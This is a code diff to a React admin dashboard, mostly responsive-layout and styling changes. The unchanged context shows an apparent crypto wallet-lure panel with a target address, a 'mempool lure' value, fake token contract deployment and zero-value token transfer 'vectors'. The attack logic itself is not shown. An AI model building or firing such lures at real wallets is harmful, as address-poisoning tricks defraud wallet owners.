@@ -487,7 +487,7 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
             : "border-[#DDE1EA] bg-white/95 text-[#101828]"
         }`}
       >
-        <div className="mx-auto flex w-full max-w-6xl items-center gap-3 px-4 py-3">
+        <div className="mx-auto flex w-full max-w-6xl items-center gap-2 px-3 py-2.5 sm:gap-3 sm:px-4 sm:py-3">
           <BrandMark size="sm" />
           <div className="hidden min-w-0 flex-1 sm:block">
             <p className={`truncate text-sm font-semibold ${theme === "dark" ? "text-[#ECEFF3]" : "text-[#101828]"}`}>
@@ -543,8 +543,16 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
           className="sticky top-20 hidden w-16 shrink-0 flex-col items-center gap-1 rounded-[24px] bg-[#101828] py-4 md:flex"
           aria-label="Admin sections"
         >
-          <div className="font-brand mb-2 flex h-9 w-9 items-center justify-center rounded-xl bg-[#D7FF00] text-sm text-[#0B0F14]">
-            3G
+          <div className="mb-2 flex h-10 w-10 items-center justify-center overflow-hidden rounded-xl bg-[#0B0F14] ring-1 ring-white/10">
+            {/* eslint-disable-next-line @next/next/no-img-element */}
+            <img
+              src={withBasePath("/logo.png")}
+              alt=""
+              width={430}
+              height={580}
+              className="h-9 w-auto object-contain"
+              aria-hidden
+            />
           </div>
           {navTabs.map(({ id, Icon, label }) => (
             <button
@@ -824,16 +832,16 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
         )}
         {tab === "vectors" && isAdmin && (
         <>
-        <section className="rounded-2xl border border-[#DDE1EA] bg-[#F4F6FA] p-4 lg:col-span-7">
+        <section className="col-span-12 min-w-0 rounded-2xl border border-[#DDE1EA] bg-[#F4F6FA] p-3 sm:p-4 lg:col-span-7">
           <LinkWallet onLinked={handleLinked} onUseAsTarget={useLinkedAsTarget} />
-          <div className="rounded-full border border-[#DDE1EA] bg-[#FFFFFF] p-3">
-            <div className="mb-2 flex items-center justify-between gap-2">
+          <div className="mt-3 rounded-2xl border border-[#DDE1EA] bg-[#FFFFFF] p-3 sm:rounded-full">
+            <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
               <p className="text-[10px] font-medium uppercase tracking-[0.16em] text-[#5B6472]">
                 Gas estimate
               </p>
               {gasLoading && <p className="text-[10px] text-[#6B7280]">Estimating…</p>}
               {gasLoading && !gasEst && (
-                <div className="space-y-2" aria-hidden>
+                <div className="w-full space-y-2" aria-hidden>
                   <div className="h-3 animate-pulse rounded-full bg-[#E6E9F0]" />
                   <div className="h-3 w-2/3 animate-pulse rounded-full bg-[#E6E9F0]" />
                 </div>
@@ -843,16 +851,16 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
               <p className="text-[10px] text-[#8A8D93]">Connect a wallet and set a target to preview gas.</p>
             )}
             {gasEst && (
-              <ul className="space-y-1 font-mono text-[10px] text-[#374151]">
-                <li className="flex items-center justify-between gap-2">
-                  <span>Lure ({amountEth.trim() || "0.001"} ETH)</span>
-                  <span>
+              <ul className="space-y-2 font-mono text-[10px] text-[#374151] sm:space-y-1">
+                <li className="flex flex-col gap-0.5 sm:flex-row sm:items-center sm:justify-between sm:gap-2">
+                  <span className="min-w-0 break-words">Lure ({amountEth.trim() || "0.001"} ETH)</span>
+                  <span className="shrink-0 tabular-nums">
                     {gasEst.lure.gasLimit} units ≈ {gasEst.lure.feeEth} ETH
                   </span>
                 </li>
-                <li className="flex items-center justify-between gap-2">
-                  <span>Zero-value ({tokenPreset})</span>
-                  <span>
+                <li className="flex flex-col gap-0.5 sm:flex-row sm:items-center sm:justify-between sm:gap-2">
+                  <span className="min-w-0 break-words">Zero-value ({tokenPreset})</span>
+                  <span className="shrink-0 tabular-nums">
                     {gasEst.zero.gasLimit} units ≈ {gasEst.zero.feeEth} ETH
                   </span>
                 </li>
@@ -865,24 +873,24 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
           </div>
         </section>
 
-        <section className="flex flex-col gap-4 rounded-2xl border border-[#DDE1EA] bg-[#F4F6FA] p-4 lg:col-span-5">
-          <div className="flex items-center justify-between gap-2">
+        <section className="col-span-12 flex min-w-0 flex-col gap-4 rounded-2xl border border-[#DDE1EA] bg-[#F4F6FA] p-3 sm:p-4 lg:col-span-5">
+          <div className="flex flex-wrap items-center justify-between gap-2">
             <p className="font-roboto text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
               Signer
             </p>
             {canSign && signer.address ? (
-              <p className="truncate font-mono text-[11px] text-[#12805C]">
+              <p className="max-w-full truncate font-mono text-[11px] text-[#12805C]">
                 {signer.address.slice(0, 6)}…{signer.address.slice(-4)}
               </p>
             ) : (
               <p className="text-[11px] text-[#D92D20]">Offline</p>
             )}
           </div>
-          <div className="flex items-center justify-between gap-2">
+          <div className="flex flex-wrap items-center justify-between gap-2">
             <p className="font-roboto text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
               Network
             </p>
-            <div className="flex gap-2">
+            <div className="flex flex-wrap gap-2">
               {([8453, 137] as const).map((id) => (
                 <button
                   key={id}
@@ -905,26 +913,26 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
               ))}
             </div>
           </div>
-          <label className="font-roboto text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
+          <label className="font-roboto block min-w-0 text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
             Target
             <input
               value={targetAddress}
               onChange={(e) => setTargetAddress(e.target.value)}
               placeholder="0x…"
-              className="mt-2 min-h-10 w-full rounded-full border border-[#CBD1DE] bg-[#FFFFFF] px-3 font-mono text-sm text-[#101828] outline-none placeholder:text-[#AEB4C2] focus:border-[#B8E600]"
+              className="mt-2 min-h-10 w-full min-w-0 rounded-full border border-[#CBD1DE] bg-[#FFFFFF] px-3 font-mono text-sm text-[#101828] outline-none placeholder:text-[#AEB4C2] focus:border-[#B8E600]"
             />
           </label>
-          <label className="font-roboto text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
+          <label className="font-roboto block min-w-0 text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
             Value (ETH · mempool lure)
             <input
               value={amountEth}
               onChange={(e) => setAmountEth(e.target.value)}
               placeholder="0.001"
               inputMode="decimal"
-              className="mt-2 min-h-10 w-full rounded-full border border-[#CBD1DE] bg-[#FFFFFF] px-3 font-mono text-sm text-[#101828] outline-none placeholder:text-[#AEB4C2] focus:border-[#B8E600]"
+              className="mt-2 min-h-10 w-full min-w-0 rounded-full border border-[#CBD1DE] bg-[#FFFFFF] px-3 font-mono text-sm text-[#101828] outline-none placeholder:text-[#AEB4C2] focus:border-[#B8E600]"
             />
           </label>
-          <div className="flex items-center justify-between gap-2">
+          <div className="flex flex-wrap items-center justify-between gap-2">
             <p className="font-roboto text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
               Contract
             </p>
@@ -937,19 +945,19 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
               {deploying ? "Deploying…" : "Deploy"}
             </button>
           </div>
-          <label className="block" aria-label="Contract address">
+          <label className="block min-w-0" aria-label="Contract address">
             <input
               value={fakeTokenContract}
               onChange={(e) => setFakeTokenContract(e.target.value)}
               placeholder="0x…"
-              className="min-h-10 w-full rounded-full border border-[#CBD1DE] bg-[#FFFFFF] px-3 font-mono text-sm text-[#101828] outline-none placeholder:text-[#AEB4C2] focus:border-[#B8E600]"
+              className="min-h-10 w-full min-w-0 rounded-full border border-[#CBD1DE] bg-[#FFFFFF] px-3 font-mono text-sm text-[#101828] outline-none placeholder:text-[#AEB4C2] focus:border-[#B8E600]"
             />
           </label>
-          <div className="flex items-center justify-between gap-2">
-            <p className="font-roboto text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
+          <div className="flex flex-col gap-2 sm:flex-row sm:items-start sm:justify-between">
+            <p className="font-roboto shrink-0 text-[11px] uppercase tracking-[0.16em] text-[#5B6472]">
               Zero-value token
             </p>
-            <div className="flex flex-wrap justify-end gap-2">
+            <div className="flex flex-wrap gap-2 sm:justify-end">
               {(Object.keys(ZERO_VALUE_PRESET_META) as ZeroValuePreset[]).filter((p) => zeroValuePresetAddress(p, netId) !== null).map((p) => (
                 <button
                   key={p}
@@ -970,7 +978,7 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
           <p className="text-[11px] leading-relaxed text-[#8A8D93]">
             Any ERC-20 works — paste its contract above (LTC-bridged, etc.), or pick a preset.
           </p>
-          <div className="grid gap-2">
+          <div className="grid grid-cols-1 gap-2 min-[420px]:grid-cols-2 lg:grid-cols-1">
             {VECTORS.map((v) => (
               <button
                 key={v.id}
@@ -982,10 +990,10 @@ export default function OpenTrustDashboard({ role }: { role?: "admin" | "staff" 
                   (v.needsContract && !fakeTokenContract.trim()) ||
                   (v.id === "mempoolLure" && noGas)
                 }
-                className="font-roboto flex min-h-10 w-full items-center justify-center gap-2 rounded-full bg-[#D7FF00] px-4 text-sm text-[#0B0F14] transition hover:bg-[#B8E600] disabled:cursor-not-allowed disabled:opacity-30"
+                className="font-roboto flex min-h-11 w-full items-center justify-center gap-2 rounded-full bg-[#D7FF00] px-4 text-sm text-[#0B0F14] transition hover:bg-[#B8E600] disabled:cursor-not-allowed disabled:opacity-30"
               >
                 {firing === v.id && <Loader2 className="h-3.5 w-3.5 shrink-0 animate-spin" />}
-                {v.label}
+                <span className="truncate">{v.label}</span>
               </button>
             ))}
           </div>
